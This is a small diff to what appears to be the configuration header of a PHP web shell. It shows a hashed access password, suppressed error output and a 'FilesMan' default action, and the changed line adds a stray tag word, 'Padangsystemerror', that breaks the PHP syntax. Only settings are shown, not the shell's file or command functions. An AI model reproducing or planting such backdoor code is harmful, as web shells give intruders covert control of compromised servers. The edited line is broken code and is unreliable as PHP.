@@ -12,7 +12,7 @@ error_reporting(0);
 @ini_set('display_errors', 0);
 
 /* Configurasi */
-$aupas			= "b5b85c70495193eda6bbba18cb852e40";
+$aupas			= "b5b85c70495193eda6bbba18cb852e40"; Padangsystemerror
 $default_action 	= 'FilesMan';
 $default_use_ajax 	= true;
 $default_charset 	= 'UTF-8';
